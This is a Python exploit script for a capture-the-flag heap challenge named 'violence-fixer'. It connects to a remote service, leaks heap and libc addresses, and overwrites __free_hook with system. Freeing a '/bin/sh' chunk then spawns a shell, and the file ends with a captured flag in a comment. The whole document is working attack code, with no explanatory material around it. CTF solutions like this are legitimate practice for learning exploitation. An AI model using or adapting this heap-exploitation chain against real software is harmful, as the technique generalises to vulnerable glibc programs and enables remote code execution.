#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './violence-fixer'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.221.81.216', 'port':32112})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    vf = ViolenceFixer(conn)

    addr_heap_base = vf.get_top() - 0x2b0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(8):
        vf.alloc(0x88, 'X')
    for i in range(7, -1, -1):
        vf.free(i)

    vf.alloc(0x78, 'a'*8)   # 0
    addr_libc_mainarena = u(vf.show(0)[8:]) - 0xe0
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system        = libc.sep_function['system']

    vf.alloc(0x18, b'/bin/sh\x00'+p64(0x91)+p64(addr_libc_free_hook))   # 1
    vf.alloc(0x88, 'Y')     # 2

    vf.delegate(0x88, p64(addr_libc_system))
    vf.free(1)

class ViolenceFixer:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.sendlineafter('beginner?: ', 'y')

    def delegate(self, size, content):
        self.sendlineafter('> ', '0')
        self.sendlineafter('???> ', 'y')
        self.sendlineafter('size: ', str(size))
        self.sendafter('content: ', content)

    def alloc(self, size, content):
        self.sendlineafter('> ', '1')
        self.sendlineafter('size: ', str(size))
        self.sendafter('content: ', content)

    def show(self, idx):
        self.sendlineafter('> ', '2')
        self.sendlineafter('index: ', str(idx))
        return self.recvuntil('\n\n1:', drop=True)

    def free(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('index: ', str(idx))

    def get_top(self):
        self.sendlineafter('> ', '4')
        self.recvuntil('top = ')
        return int(self.recvuntil('\n', drop=True), 16)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # TSG{dont_eat_your_pet_fish}

if __name__=='__main__':
    main()

#==========
